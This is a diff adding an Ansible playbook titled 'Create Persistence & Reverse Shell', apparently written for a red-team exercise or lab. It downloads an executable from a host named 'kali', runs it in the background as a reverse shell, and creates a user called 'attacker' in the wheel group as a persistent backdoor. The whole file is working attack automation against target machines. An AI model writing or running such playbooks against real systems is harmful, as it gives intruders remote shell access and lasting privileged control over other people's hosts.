@@ -1,0 +1,26 @@
+---
+- name: Create Persistence & Reverse Shell
+  hosts: target 
+  become: no 
+  tasks:
+    - name: Get Reverse Shell Executable
+      get_url:
+        url: http://kali/setuplinux.exe
+        dest: ~/
+        mode: 0777
+   
+    - name: Execute Reverse Shell
+      shell: nohup ~/setuplinux.exe & exit
+
+    - name: Create Malicious user
+      user:
+        name: attacker
+        state: present
+        createhome: yes
+        group: wheel
+        append: yes
+      ignoreerrors: true
+
+
+
+  
